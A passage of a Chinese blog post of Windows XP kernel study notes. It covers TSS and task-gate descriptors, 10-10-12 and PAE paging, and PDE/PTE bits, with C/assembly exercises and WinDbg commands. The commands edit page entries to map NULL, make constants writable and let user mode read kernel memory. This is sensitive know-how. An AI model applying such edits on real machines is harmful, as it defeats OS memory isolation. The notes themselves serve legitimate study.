class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">call fword ptr[buff]</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok: %d\nESP: %x\nCS: %x\n&quot;</span>, dwOk, dwESP, dwCS);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x18-任务门"><a href="#0x18-任务门" class="headerlink" title="0x18.任务门"></a>0x18.任务门</h1><p>本节通过任务门访问任务段。</p><p>注意，任务门描述符在IDT表中，但其中的TSS选择子在GDT表中，其实画个图就全知道了</p><p>任务门描述符(Reserved为保留位，填0即可)：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917215214051.png"></p><p>任务门执行过程：</p><ol><li><code>INT N</code>（即查IDT索引）</li><li>查IDT表，找到任务门描述符</li><li>通过任务门描述符，查GDT表，找到TSS段描述符</li><li>使用TSS段中的值修改TR寄存器</li><li><code>IRETD</code>返回</li></ol><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>需要构造任务门描述符和TSS描述符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eq 8003f500 0000e500`00480000//任务门描述符</span><br><span class="line">eq 8003f048 xx00e9xx`xxxx0068//TSS描述符,xxxx是TSS malloc（(104)的地址</span><br></pre></td></tr></table></figure><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917221940639.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD *TSS;</span><br><span class="line">DWORD dwOk;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">dwOk = <span class="number">1</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">iretd</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line"><span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// GDT：TSS描述符</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line"><span class="comment">// IDT：任务门描述符</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f500 0000e500`00480000\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制TSS.exe进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line"></span><br><span class="line">TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x500</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//call fword ptr[buff]</span></span><br><span class="line"><span class="comment">//jmp fword ptr[buff]</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok: %d\n&quot;</span>,dwOk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x19-10-10-12分页"><a href="#0x19-10-10-12分页" class="headerlink" title="0x19.10-10-12分页"></a>0x19.10-10-12分页</h1><p>首先说下，有效地址 ，线性地址，物理地址：</p><p><code>MOV eax,dword ptr ds:[0x12345678]</code></p><ul><li>其中,0x12345678 是有效地址</li><li><code>ds.Base + 0x12345678</code> 是线性地址</li><li>物理地址就不用说了，要找的就是这个</li></ul><p> x86中分页的方式有两种：</p><ul><li><code>10-10-12</code></li><li><code>2-9-9-12</code></li></ul><p>修改boot.ini，之后重启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /execute=optin /fastdetect /debug /debugport=com1 /baudrate=115200</span><br></pre></td></tr></table></figure><p>这时就是10-10-12分页了。</p><p>打开个记事本，写点东西，之后CE打开，注意选择unicode：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918144624863.png"></p><p>再随便修改下，找到线性地址：<code>000AB468</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">000A B468</span><br><span class="line">0000 0000 0000 1010 1011 0100 0110 1000</span><br><span class="line">0000 0000 00//0</span><br><span class="line">00 1010 1011//AB，这里后面查的时候需要*4=2AC</span><br><span class="line">0100 0110 1000//468</span><br></pre></td></tr></table></figure><p>每个进程都有一个<code>CR3</code>(这里存的是物理地址)，准确的说是都一个CR3的值，CR3本身是个寄存器，一个核，只有一套寄存器。 </p><p>CR3指向一个物理页，一共4096字节</p><p>之后找到CR3，也就是DirBase：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918145721145.png"></p><p>查物理内存的话是<code>!dd</code></p><p>第一级：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918150026313.png"></p><p>每四字节最后的是属性，用的时候填0即可。</p><p>第二级：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918150143370.png"></p><p>第三级：helloworld就存在这里(物理地址)</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918150308389.png"></p><h1 id="020-PDE-PTE"><a href="#020-PDE-PTE" class="headerlink" title="020.PDE_PTE"></a>020.PDE_PTE</h1><p>注意区别：<code>PDT，PTT，PDE，PTE</code></p><p>PTE可以不指向物理页，多个PTE也可以指向同一个物理页</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918151003514.png"></p><p>正常编程中，不能读写NULL，原因是NULL指针没有对应的物理页，因此，只要我们让NULL指针最终映射到一块可读写的物理页，就可以用NULL去读写数据了。</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918152409888.png"></p><p>x的物理地址查找：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918152641394.png"></p><p>一个进程只有一个CR3，分解NULL后：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918152850045.png"></p><p>用!ed指令改写成x的PTE：0f746867<br><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918153023964.png"></p><p>成功在NULL地址写入：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918153103508.png"></p><h1 id="021-PDE-PTE属性-P-RW"><a href="#021-PDE-PTE属性-P-RW" class="headerlink" title="021.PDE_PTE属性(P_RW)"></a>021.PDE_PTE属性(P_RW)</h1><p><strong><code>物理页的属性 = PDE属性 &amp; PTE属性</code></strong></p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918153555496.png"></p><h2 id="修改常量"><a href="#修改常量" class="headerlink" title="修改常量"></a>修改常量</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *str = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> addr = (<span class="keyword">int</span>)str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线性地址：0x%08x, 4*0x%x 4*0x%x 0x%x\n&quot;</span>, addr, addr&gt;&gt;<span class="number">22</span>,(addr&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0x000002FF</span>,addr&amp;<span class="number">0x00000FFF</span>);</span><br><span class="line">getchar(); <span class="comment">// 修改 PDE PTE 的 RW 位为1，使物理页可读可写</span></span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改后：%s\n&quot;</span>, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改PTE的RW&#x3D;1即可：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918214341108.png"></p><p>成功修改：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918214451606.png"></p><h1 id="022-PDE-PTE属性-US-PS-A-D"><a href="#022-PDE-PTE属性-US-PS-A-D" class="headerlink" title="022.PDE_PTE属性(US_PS_A_D )"></a>022.PDE_PTE属性(US_PS_A_D )</h1><h2 id="U-x2F-S位"><a href="#U-x2F-S位" class="headerlink" title="U&#x2F;S位"></a>U&#x2F;S位</h2><ul><li>U&#x2F;S&#x3D;0：特权用户可以访问</li><li>U&#x2F;S&#x3D;1：普通用户可以访问</li></ul><h2 id="读高2G内存地址："><a href="#读高2G内存地址：" class="headerlink" title="读高2G内存地址："></a>读高2G内存地址：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PWORD p=(PWORD)<span class="number">0X8003f00C</span>;</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;高2G地址：%x\n&quot;</span>,*p);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找并修改PDE和PTE：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918220530341.png"></p><p>成功读取：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220918220442272.png"></p><h2 id="P-x2F-S位"><a href="#P-x2F-S位" class="headerlink" title="P&#x2F;S位"></a>P&#x2F;S位</h2><p>只对PDE有意义，<code>PS = PageSize</code>的意思，当PS&#x3D;1的时候，PDE直接指向物理页，无PTE，低22位是页内偏移。</p><p>线性地址只能拆成2段：大小为4MB   俗称“大页”</p><h2 id="A位"><a href="#A位" class="headerlink" title="A位"></a>A位</h2><p>是否被访问（读或者写）过 ，访问过置1 ，即使只访问一个字节也会导致PDE PTE置1</p><h2 id="D位"><a href="#D位" class="headerlink" title="D位"></a>D位</h2><p>脏位，是否被写过，0没有被写过，1被写过</p><h1 id="023-页目录表基址"><a href="#023-页目录表基址" class="headerlink" title="023.页目录表基址"></a>023.页目录表基址</h1><h2 id="页目录表PDT"><a href="#页目录表PDT" class="headerlink" title="页目录表PDT"></a>页目录表PDT</h2><p><code>0xC0300000</code> 指向<code>PDT</code><br><code>0xC0000000</code> 指向第一张页表<code>PTT</code><br>页目录表其实是一张特殊的页表，它是第0x300张页表。<br>页目录表中每项PTE都指向一张页表，其中第0x300项指向了页目录表自己。</p><h2 id="页表PTT"><a href="#页表PTT" class="headerlink" title="页表PTT"></a>页表PTT</h2><p>页表总共有1024张，每张4KB，总共占了1024*4KB&#x3D;4MB内存，1024张页表的线性地址是连续的，但物理地址不连续。<br>页表被映射到了从0xC0000000到0xC03FFFFF的4MB地址空间。<br>在这1024个页表中，第0x300个是一张特殊的表：页目录表。</p><h1 id="024-页表基址"><a href="#024-页表基址" class="headerlink" title="024.页表基址"></a>024.页表基址</h1><p>XP 10-10-12分页下PDT、PTT、物理页关系图</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220919215916582.png"></p><p>这意味着我们可以通过 <code>0xC0000000</code> 找到任何一个 PTE。公式如下（PDI 是页目录表的下标，PTI是页表的下标）：</p><p><strong><code>PDE = 0xC0300000 + PDI * 4</code></strong><br><strong><code>PTE = 0xC0000000 + PDI * 4KB + PTI * 4</code></strong></p><h1 id="025-2-9-9-12分页"><a href="#025-2-9-9-12分页" class="headerlink" title="025.2-9-9-12分页"></a>025.2-9-9-12分页</h1><p>10-10-12分页还是2-9-9-12分页都是从后面分的。</p><p>2-9-9-12分页,又称为PAE（物理地址扩展）分页</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220920000300402.png"></p><h2 id="查看物理地址"><a href="#查看物理地址" class="headerlink" title="查看物理地址"></a>查看物理地址</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0x12345678</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;address:%p\n&quot;</span>,&amp;a);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>!vtop</code>指令可以查看各表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !vtop 02880320 0012ff7c</span><br><span class="line">X86VtoP: Virt 000000000012ff7c, pagedir 0000000002880320</span><br><span class="line">X86VtoP: PAE PDPE 0000000002880320 - 000000000dd5d801</span><br><span class="line">X86VtoP: PAE PDE 000000000dd5d000 - 000000000dcc0867</span><br><span class="line">X86VtoP: PAE PTE 000000000dcc0978 - 800000000e145867</span><br><span class="line">X86VtoP: PAE Mapped phys 000000000e145f7c</span><br><span class="line">Virtual address 12ff7c translates to physical address e145f7c.</span><br><span class="line">kd&gt; !dd 000000000e145f7c</span><br><span class="line"># e145f7c 12345678 0012ffc0 00401569 00000001</span><br><span class="line"># e145f8c 00380ff0 00381078 00241fe4 0012f7bc</span><br><span class="line"># e145f9c 7ffdc000 00000001 00000006 0012ff94</span><br><span class="line"># e145fac 806224ce 0012ffe0 00406b50 0040e238</span><br><span class="line"># e145fbc 00000000 0012fff0 7c817077 00241fe4</span><br><span class="line"># e145fcc 0012f7bc 7ffdc000 8054c6ed 0012ffc8</span><br><span class="line"># e145fdc 81ccb348 ffffffff 7c839ad8 7c817080</span><br><span class="line"># e145fec 00000000 00000000 00000000 00401480</span><br></pre></td></tr></table></figure><h1 id="026-2-9-9-12分页"><a href="#026-2-9-9-12分页" class="headerlink" title="026.2-9-9-12分页"></a>026.2-9-9-12分页</h1><h2 id="PDPTE"><a href="#PDPTE" class="headerlink" title="PDPTE"></a>PDPTE</h2><p>一共有四个</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220920000407513.png"></p><h2 id="PDE"><a href="#PDE" class="headerlink" title="PDE"></a>PDE</h2><p>1、当PS&#x3D;1时是大页，35-21位是大页的物理地址，这样36位的物理地址的低21位为0，这就意味着页的大小为2MB，且都是2MB对齐。2、当PS&#x3D;0时，35-12位是页表基址,低12位补0，共36位。</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220920000444805.png"></p><h2 id="PTE"><a href="#PTE" class="headerlink" title="PTE"></a>PTE</h2><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220920000540021.png"></p><p>改成2-9-9-12分页：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[boot loader]</span><br><span class="line">timeout=30</span><br><span class="line">default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS</span><br><span class="line">[operating systems]</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect /debug /debugport=com1 /baudrate=115200</span><br></pre></td></tr></table></figure><p><code>!vtop</code>指令可以查看各表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !vtop 028802a0 0</span><br><span class="line">X86VtoP: Virt 0000000000000000, pagedir 00000000028802a0</span><br><span class="line">X86VtoP: PAE PDPE 00000000028802a0 - 000000000c47a801</span><br><span class="line">X86VtoP: PAE PDE 000000000c47a000 - 000000001ba0a867</span><br><span class="line">X86VtoP: PAE PTE 000000001ba0a000 - 0000000000000000</span><br><span class="line">X86VtoP: PAE zero PTE</span><br><span class="line">Virtual address 0 translation fails, error 0xD0000147.</span><br></pre></td></tr></table></figure><h2 id="给0线性地址挂上物理页"><a href="#给0线性地址挂上物理页" class="headerlink" title="给0线性地址挂上物理页"></a>给0线性地址挂上物理页</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;可用的物理页基址：%p\n&quot;</span>, data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请在windbg中给NULL挂物理页.\n&quot;</span>);</span><br><span class="line">getchar(); <span class="comment">// windbg...</span></span><br><span class="line"><span class="comment">// 读写NULL</span></span><br><span class="line">*p = <span class="number">0x20201008</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*NULL = %x\n&quot;</span>, *p);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span 